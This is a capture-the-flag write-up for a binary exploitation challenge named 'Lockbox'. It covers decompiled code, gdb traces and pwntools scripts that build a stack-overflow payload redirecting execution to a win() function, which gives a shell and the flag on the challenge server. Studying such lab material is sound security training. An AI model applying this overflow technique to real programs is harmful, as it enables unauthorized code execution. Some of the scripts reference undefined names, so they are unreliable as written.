Writeup for [[Lockbox]]
Points: 200
Location: `nc offsec-chalbroker.osiris.cyber.nyu.edu 1336`
Download: `lockbox`
###### First Run:
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ ./lockbox  
I've locked my shell in a lockbox, you'll never get it now!

But give it your best try, what's the combination?
> 
1337
zsh: segmentation fault  ./lockbox

```
###### Ghidra:
```c
undefined8 main(void)

{
  char guess [16];
  undefined8 *local_38;
  undefined8 local_30;
  
  FUN_004010c0(stdout,0,2,0);
  FUN_004010c0(stdin,0,2,0);
  fflush(stdout);
  puts("I\'ve locked my shell in a lockbox, you\'ll never get it now!\n");
  puts("But give it your best try, what\'s the combination?\n> ");
  gets(guess);
  *local_38 = local_30;
  return 0;
}
```
This uses `gets` too, though it's not immediately clear how the data is used.

ALso have this beautiful thing:
```c
void win(void)
{
  if (key == -0x25224f23) {
    mystring._0_8_ = 0x68732f6e69622f;
  }
  system(mystring);
  return;
}
```
However, we never call this

Goal: Call `win` by overwriting the top of the stack for when `main` returns


But first, getting past the segfault:
The segfault happens at this line:
```
0x00000000004012a4 <+172>:   mov    %rdx,(%rax)
```
The program attempts to move the data stored in `rdx` into the address stored in `rax`, but it crashes when `rax` does not hold a valid address data.
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ gdb ./lockbox    
I've locked my shell in a lockbox, you'll never get it now!
But give it your best try, what's the combination?
> 
1337

Program received signal SIGSEGV, Segmentation fault.
0x00000000004012a4 in main ()
(gdb) info registers
rax            0x0                 0
```

Some fuzzing helps me determine that `RAX` starts to get overwritten after 16 characters of input
```python
def fuzz(p):
	data = 'A' * 16
	n = 0
	p.sendline("break *0x00000000004012a4")
	while True:
		print("############################")
		print("# Now with " + str(n + 16) + " As           #")
		print("############################")
		p.sendline("r")
		p.recvuntil(">")
		payload = data + 'A' * n + "\n"
		p.send(payload)
		#p.interactive()
		p.recvuntil("Breakpoint ")
		d = p.recv()
		print("Breakpoint " + cleanLine(d))
		printStack(p, 20)
		getInfoRegs(p)
		n += 1
		p.sendline("c")
		p.recv(timeout=0.05)
		if n == 23:
			break
```
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 newdbg.py
############################
# Now with 16 As           #
############################
Breakpoint 1, 0x00000000004012a4 in main ()
0x7fffffffddb0:    0x41414141    0x41414141    0x41414141    0x41414141
0x7fffffffddc0:    0x00000000    0x00000000    0x00000000    0x00000000
rax            0x0                 0

############################
# Now with 17 As           #
############################
Breakpoint 1, 0x00000000004012a4 in main ()
0x7fffffffddb0:    0x41414141    0x41414141    0x41414141    0x41414141
0x7fffffffddc0:    0x00000041    0x00000000    0x00000000    0x00000000
rax            0x41                65

...omitted for brevity...
############################
# Now with 20 As           #
############################
Breakpoint 1, 0x00000000004012a4 in main ()
0x7fffffffddb0:    0x41414141    0x41414141    0x41414141    0x41414141
0x7fffffffddc0:    0x41414141    0x00000000    0x00000000    0x00000000
rax            0x41414141          1094795585
```

So, by sending a payload with 16 char of padding and a valid address, we can avoid the segfault. I used the address of `key` because it was something I knew was valid

```python
def keyPld():
	base = b"".join([struct.pack("B", 0x41) for i in range(0,16)])
	key = b"".join([struct.pack("B", 0x50), struct.pack("B", 0x40), struct.pack("B", 0x40), struct.pack("B", 0x00)])
	pad0 = b"".join([struct.pack("B", 0x00) for i in range(0,4)])
	return base + data + pad0
def sendPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./lockbox -q')
	p.sendline("r")
	d = p.recvuntil(">")
	pld = keyPld()
	p.sendline(pld)
	p.interactive()
```
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 keytest.py
[*] Switching to interactive mode
[Inferior 1 (process 226978) exited normally]
```

But now, we have to figure out how to call win.

I'm going to add more data after the address in the payload to see what happens.
```python
def testPld():
	base = b"".join([struct.pack("B", 0x41) for i in range(0,16)])
	data = b"".join([struct.pack("B", 0x50), struct.pack("B", 0x40), struct.pack("B", 0x40), struct.pack("B", 0x00)])
	d2 = b"".join([struct.pack("B", 0x00) for i in range(0,4)])
	d3 = cyclic(500)
	return base + data + d2 + d3

def ripOffset():
	p = process('./lockbox')
	d = p.recvuntil(">")
	p.sendline(testPld())
	p.wait()
	cf = p.corefile
	stack = cf.rsp
	info("rsp = %#x", stack)
	pattern = cf.read(stack, 4)
	ripOffset = cyclic_find(pattern)
	info("rip offset = %d", ripOffset)	

```
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 newdbg.py
[+] Starting local process './lockbox': pid 63811
[*] Process './lockbox' stopped with exit code -11 (SIGSEGV) (pid 63811)
[+] Parsing corefile...: Done
[*] '/home/kali/Desktop/4-Week/core.63811'
    Arch:      amd64-64-little
    RIP:       0x4012ad
    RSP:       0x7ffedf978de8
    Exe:       '/home/kali/Desktop/4-Week/lockbox' (0x400000)
    Fault:     0x6161616e6161616d
[*] rsp = 0x7ffedf978de8
[*] rip offset = 48
```
`rip` points to
```
0x00000000004012ad <+181>:   ret
```
It looked like the fault happened when the program popped `0x6161616e6161616d` off the stack and tried to return to that address.
That data starts at the 48th byte of data after my key payload

After sending a new payload with 16 A's + `addr[key]` + 4 0's + 48 b's + `addr[win]`  + 4 0's, I got a segfault in a different place

```
└─$ python3 newdbg.py
[+] Starting local process './lockbox': pid 65599
/home/kali/Desktop/4-Week/newdbg.py:95: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  d = p.recvuntil(">")
[*] Process './lockbox' stopped with exit code -11 (SIGSEGV) (pid 65599)
[+] Parsing corefile...: Done
[*] '/home/kali/Desktop/4-Week/core.65599'
    Arch:      amd64-64-little
    RIP:       0x4011f7
    RSP:       0x7ffc6b467de8
    Exe:       '/home/kali/Desktop/4-Week/lockbox' (0x400000)
    Fault:     0x4242424242424242
[*] rsp = 0x7ffc6b467de8
```
What we like about this Segfault is that it happens at an address in `win`, meaning we've successfully jumped there and it's almost returned
```
(gdb) $ disas win
Dump of assembler code for function win:
   0x00000000004011b6 <+0>:    endbr64
   0x00000000004011ba <+4>:    push   %rbp
   0x00000000004011bb <+5>:    mov    %rsp,%rbp
   0x00000000004011be <+8>:    mov    $0xfffffffffffffff0,%rax
   0x00000000004011c5 <+15>:    and    %rax,%rsp
   0x00000000004011c8 <+18>:    mov    0x2e82(%rip),%eax        # 0x404050 <key>
   0x00000000004011ce <+24>:    cmp    $0xdaddb0dd,%eax
   0x00000000004011d3 <+29>:    jne    0x4011e6 <win+48>
   0x00000000004011d5 <+31>:    movabs $0x68732f6e69622f,%rax
   0x00000000004011df <+41>:    mov    %rax,0x2e7a(%rip)        # 0x404060 <mystring>
   0x00000000004011e6 <+48>:    lea    0x2e73(%rip),%rax        # 0x404060 <mystring>
   0x00000000004011ed <+55>:    mov    %rax,%rdi
   0x00000000004011f0 <+58>:    call   0x401090 <system@plt>
   0x00000000004011f5 <+63>:    nop
   0x00000000004011f6 <+64>:    pop    %rbp
=> 0x00000000004011f7 <+65>:    ret
```

However, looking back to the compare operation in `win` where it checks the secret, we can see that `eax` is overwritten by my padding:
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 keytest.py

[*] Switching to interactive mode
Breakpoint 1, 0x00000000004011ce in win ()
(gdb) $ disas win
Dump of assembler code for function win:
   0x00000000004011b6 <+0>:    endbr64
   0x00000000004011ba <+4>:    push   %rbp
   0x00000000004011bb <+5>:    mov    %rsp,%rbp
   0x00000000004011be <+8>:    mov    $0xfffffffffffffff0,%rax
   0x00000000004011c5 <+15>:    and    %rax,%rsp
   0x00000000004011c8 <+18>:    mov    0x2e82(%rip),%eax        # 0x404050 <key>
=> 0x00000000004011ce <+24>:    cmp    $0xdaddb0dd,%eax
   ...omitted for brevity...
   0x00000000004011f7 <+65>:    ret
End of assembler dump.
(gdb) $ info registers eax
eax            0x61616161          1633771873
```

It's overwritten by the first four characters of data, so, by putting `0xdaddb0dd` after the key and padding, we should be able to pass the compare
```python
def secretPayload():
	pad16 = b"".join([struct.pack("B", 0x41) for i in range(0,16)])
	keyAddr = b"".join([struct.pack("B", 0x50), struct.pack("B", 0x40), struct.pack("B", 0x40), struct.pack("B", 0x00)])
	pad0 = b"".join([struct.pack("B", 0x00) for i in range(0,4)])
	secret = b"".join([struct.pack("B", 0xdd), struct.pack("B", 0xb0), struct.pack("B", 0xdd), struct.pack("B", 0xda)])
	pad44 = b"".join([struct.pack("B", 0x42) for i in range(0,44)])
	win = b"".join([struct.pack("B", 0xb6), struct.pack("B", 0x11), struct.pack("B", 0x40), struct.pack("B", 0x00)])
	return pad16 + keyAddr + pad0 + secret + pad44 + win + pad0
```

```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 keytest.py
[*] Switching to interactive mode
Breakpoint 1, 0x00000000004011ce in win ()
(gdb) $ info registers eax
eax            0xdaddb0dd          -623005475
(gdb) $ c
Continuing.
[Detaching after vfork from child process 245166]
$ 
[*] Stopped process '/bin/bash' (pid 245077)
```

When ran without gdb
```python
def testRun():
	p =  process('./lockbox')
	d = p.recvuntil(">")
	pld = secretPld()
	p.sendline(pld)
	p.interactive()
```
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 keytest.py
[*] Switching to interactive mode
 
$ whoami
kali
$ pwd
/home/kali/Desktop/4-Week
$  zsh: suspended (signal)  python3 keytest.py
```

When ran against the remote server:
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 keytest.py
[*] Switching to interactive mode
 
$ whoami
pwn
$ ls
flag.txt
lockbox
$ cat flag.txt
flag{Wh0_n33d5_A_k33y_wen_U_h4v3_a_B0F}
$  zsh: suspended (signal)  python3 keytest.py

```

Yay